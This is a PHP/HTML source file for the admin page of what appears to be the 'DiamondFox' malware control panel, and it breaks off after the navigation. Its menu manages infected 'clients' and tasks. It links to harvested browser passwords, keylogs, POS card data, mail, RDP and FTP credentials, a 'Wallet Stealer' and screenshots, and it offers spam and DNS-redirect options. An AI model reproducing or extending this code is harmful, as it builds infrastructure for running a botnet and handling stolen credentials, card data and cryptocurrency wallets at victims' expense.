<?php
error_reporting(0);
session_start();

require_once('session.php');
require_once('config.php');



?>

<html>
  <head>
    <title>
      Administration
    </title>
    <link href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:200,300,400,600" rel="stylesheet" type="text/css" />
    <script src="js/skel.min.js">
    </script>
    <script src="js/init.js">
    </script>
    <script src="js/colapse.js">
    </script>
    </script>
    <script src="js/popup.js">
    </script>

    <noscript>
      <link rel="stylesheet" href="css/style-wide.css" />      
    </noscript>
  </head>
  <body>
    
    <div id="header" class="skel-panels-fixed">
      
      <div class="top">
        
        <div id="logo">
          <span class="image avatar48">
            <img src="img/avatar.jpg" alt="" />
          </span>
          <h1 id="title">
            <?=$correctuser?>
          </h1>
          
          <span class="byline">
            /*DiamondFox*/
          </span>
        </div>
        
        <nav id="nav">
          <ul>
            <li>
              <a href="home.php" id="contact-link" class="skel-panels-ignoreHref">
                <span class="icon icon-home">
                  Home
                </span>
              </a>
              <li>
                <a href="clients.php" id="top-link" class="skel-panels-ignoreHref">
                  <span class="icon icon-group">
                    Clients
                  </span>
                </a>
            </li>
            <li>
              <a href="tasks.php" id="portfolio-link" class="skel-panels-ignoreHref">
                <span class="icon icon-tasks">
                  Tasks
                </span>
              </a>
            </li>
            <li>
              <a href="statistics.php" id="about-link" class="skel-panels-ignoreHref">
                <span class="icon icon-th">
                  Statistics
                </span>
              </a>
            </li>
            <li>
              <a href="#" onclick="swap('sectionOneLinks');return false;" id="contact-link" class="skel-panels-ignoreHref">
                <span class="icon icon-copy">
                  Reports
                </span>
              </a>
              <ul id="sectionOneLinks" style="display: none;" class="icons">
                <table boder=0 width=250>
                  <tr>
                    <td width=100>
                      <center>
                        <a href="reports.php?p=bG9ncy9wYXNz" title="Browser Passwords" class="icon icon-key">
                          <span>
                          </span>
                        </center>
                      </td>
                      <td width=100>
                        <center>
                          <a href="reports.php?p=bG9ncy9reWw=" title="Keylogs" class="icon icon-keyboard">
                            <span>
                            </span>
                          </center>
                        </td>
                        <td width=100>
                          <center>
                            <a href="reports.php?p=bG9ncy9kdW1w" title="POS Data" class="icon icon-credit-card">
                              <span>
                              </span>
                            </center>
                          </td>
                    </tr>
                  <tr>
                    <td width=100>
                      <center>
                        <a href="reports.php?p=bG9ncy9tYWls" title="Mails, POP3, IMAP" class="icon icon-envelope">
                          <span>
                          </span>
                        </center>
                      </td>
                      <td width=100>
                        <center>
                          <a href="reports.php?p=bG9ncy9yZHA=" title="RDP" class="icon icon-desktop">
                            <span>
                            </span>
                          </center>
                        </td>
                        <td width=100>
                          <center>
                            <a href="reports.php?p=bG9ncy9mdHA=" title="FTP" class="icon icon-link">
                              <span>
                              </span>
                            </center>
                          </td>
                    </tr>
                  <tr>
                    <td width=100>
                      <center>
                        <a href="reports.php?cmd=bG9ncy93YWxsZXQ=" title="Wallet Stealer" class="icon icon-btc">
                          <span>
                          </span>
                        </center>
                      </td>
                      <td width=100>
                      <center>
                        <a href="reports.php?cmd=Z2FsbGVyeQ==" title="Screenshots" class="icon icon-screenshot">
                          <span>
                          </span>
                        </center>
                      </td>
                    </tr>
                </table>
              </ul>
            </li>
          </ul>
        </nav>
        
      </div>
      
      <div class="bottom">
        
        <ul class="icons">
          <li>
            <a href="index.php?cmd=logout" title="Logout" class="icon icon-signout">
              <span>
              </span>
            </a>
          </li>
          <li>
            <a href="tasks.php?cd=Y2xlYW4" title="Clean Dead Bots" class="icon icon-trash">
              <span>
              </span>
            </a>
          </li>
          <li>
            <a href="javascript:new_window('dwn.php?cmd=compress')" title="Download All Logs" class="icon icon-download-alt">
              <span>
              </span>
            </a>
          </li>
          
          <!--download all logs-->
          <li>
            <a href="javascript:new_window('inc/spm.php')" title="Spam Options" class="icon icon-envelope">
              <span>
              </span>
            </a>
          </li>
          <li>
            <a href="javascript:new_window('inc/host.php')" title="DNS Redirects" class="icon icon-edit">
              <span>
              </span>
            </a>
          </li>
        </ul>
        
      </div>
      
    </div>
    
    <div id="main">
      
      
      <section class="four">
        <div id="content" class="clearfix">